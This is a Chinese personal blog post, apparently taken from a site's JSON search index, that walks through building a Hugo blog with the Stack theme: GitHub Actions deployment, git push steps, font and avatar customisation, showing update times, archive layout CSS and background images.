https://letere-gzj.github.io/hugo-stack/\n跟着博客就搭建完了\n到github自动部署这有些改动\n博客根目录/.github/workflows/自己起的名字.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 name: deploy # 代码提交到main分支时触发github action on: push: branches: - main jobs: deploy: runs-on: ubuntu-24.04 #ubuntu版本不能用latest steps: - name: Checkout uses: actions/checkout@v4 with: fetch-depth: 0 - name: Setup Hugo uses: peaceiris/actions-hugo@v3 with: hugo-version: \u0026#34;0.129.0\u0026#34; #这里要改成本地hugo的版本 git自动部署后推送 第一次推送是这样\n1 2 3 4 5 6 git init git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin {你的github仓库地址} git push -u origin main 后续推送只需要\n1 2 3 git add . git commit -m \u0026#34;first commit\u0026#34; git push 头像修改 文件路径:boke\\assets\\img\n图片命名为avatar.png\n优先加载主目录下的\n字体修改 下载字体\n100font.com - 免费商用字体大全 - 免费字体下载网站\n把字体文件放入assets/font下\n将以下代码修改并复制到layouts/partials/footer/custom.html文件中(文件不存在就自己创建)\n字体名：给字体命名一个别名，随便填写就好，保持统一就行\n字体文件名：字体文件的全名，带后缀名的，也就是 xxx.ttf\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;style\u0026gt; @font-face { font-family: \u0026#39;字体名\u0026#39;; src: url({{ (resources.Get \u0026#34;font/字体文件名\u0026#34;).Permalink }}) format(\u0026#39;truetype\u0026#39;); } :root { --base-font-family: \u0026#39;字体名\u0026#39;; --code-font-family: \u0026#39;字体名\u0026#39;; } \u0026lt;/style\u0026gt; 显示文章更新时间 (1) 在配置文件 hugo.yaml 中加入以下配置\n1 2 3 4 5 6 7 8 # 更新时间：优先读取git时间 -\u0026gt; git时间不存在，就读取本地文件修改时间 frontmatter: lastmod: - :git - :fileModTime # 允许获取Git信息\tenableGitInfo: true (2) 若想在文章开头就显示更新时间，修改layouts/partials/article/components/detail.html，在指定位置引入以下代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div class=\u0026#34;article-details\u0026#34;\u0026gt; ... \u0026lt;footer class=\u0026#34;article-time\u0026#34;\u0026gt; ... \u0026lt;!-- 更新时间 --\u0026gt; {{- if ne .Lastmod .Date -}} \u0026lt;div class=\u0026#34;article-lastmod\u0026#34;\u0026gt; {{ partial \u0026#34;helper/icon\u0026#34; \u0026#34;clock\u0026#34; }} \u0026lt;time\u0026gt; {{ .Lastmod.Format ( or .Site.Params.dateFormat.lastUpdated \u0026#34;Jan 02, 2006 15:04 MST\u0026#34; ) }} \u0026lt;/time\u0026gt; \u0026lt;/div\u0026gt; {{- end -}} .... \u0026lt;/footer\u0026gt; ... \u0026lt;/div\u0026gt; 这样就会文章开头显示修改时间 tips: 更新时间的格式去 hugo.yaml 中的 params.dateFormat.lastUpdated 进行修改 友链、归档多列显示 修改assets/scss/custom.scss文件(不存在则自行创建)，引入以下css样式代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @media (min-width: 1024px) { .article-list--compact { display: grid; // 目前是两列，如需三列，则后面再加一个1fr，以此类推 grid-template-columns: 1fr 1fr; background: none; box-shadow: none; gap: 1rem; article { background: var(--card-background); border: none; box-shadow: var(--shadow-l2); margin-bottom: 8px; margin-right: 8px; border-radius: 16px; } } } 图片api https://t.mwm.moe/fj 二次元风景 https://imgapi.xl0408.top/index.php 直接把图片链接放到image\n用本地图片的话,绝对路径有点逆天,直接放到和文章同一文件夹就好了\n博客的一些设置 创建文章 一般用hugo命令创建文章的时候都是用的hugo new xxx/xxx/index.md\n尽量创建文章后命名用index.md来命名,否则图片会缺失\n文章会自带这些东西\n1 2 3 title = \u0026#39;Markdown\u0026#39; date = 2024-12-31T15:27:48+08:00 draft = true 但是如果想要文章封面的话需要加image等属性,每次都要手动加的话太麻烦\n找到博客根目录/archetypes/default.md\n1 2 3 4 5 6 7 8 9 10 11 title = \u0026#39;{{ replace .File.ContentBaseName \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#39; date = {{ .Date }} draft = true author = \u0026#39;一个俗人\u0026#39; #想固定的就赋值 categories = [] image = \u0026#39;\u0026#39; #不想设置固定的就让他为空 description = \u0026#39;\u0026#39; 每次创建完文章后这些都会放在头上\n博客首页文章 博客首页的文章如果一开始删了content/post文件夹的话会导致首页没有文章\n如果想要更改放在首页的文章\n找到根目录下的hugo.yaml,打开搜索mainSections\n1 2 3 params: mainSections: - dajian # - 这里放文章文件夹的名字 然后网站首页就会显示这个文件夹里的文章了\n归档分类封面 根目录\\content\\categories\\分类的文件夹\n这里的md一定要为**_index.md**,否则不生效\n主页面背景设置 找到博客根目录\\layouts\\partials\\footer\\custom.html\n图片随机api\n1 2 3 4 5 body { background: url(\u0026#34;https://t.mwm.moe/fj\u0026#34;) no-repeat center top; background-size: cover; background-attachment: fixed; } 图片静态\n图片放到**\\assets\\background**\n1 2 3 4 5 6 7 \u0026lt;style\u0026gt; body { background: url({{ (resources.Get \u0026#34;background/背景图片名\u0026#34;).Permalink }}) no-repeat center top; background-size: cover; background-attachment: fixed; } \u0026lt;/style\u0026gt; 结语 博客一直都想着弄的,也是熬到2024的最后一天了(；´д｀)ゞ\n笔记都放到语雀上了,后续会放到博客上,本人菜鸡,大佬们勿喷d(´ω｀*)\n","date":"2024-12-31T14:54:43+08:00","image":"https://gsygsr.github.io/dajian/boke/0_hufacb938ae3fcb28eeaac68e6daac5c09_205100_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/dajian/boke/","title":"博客搭建"}]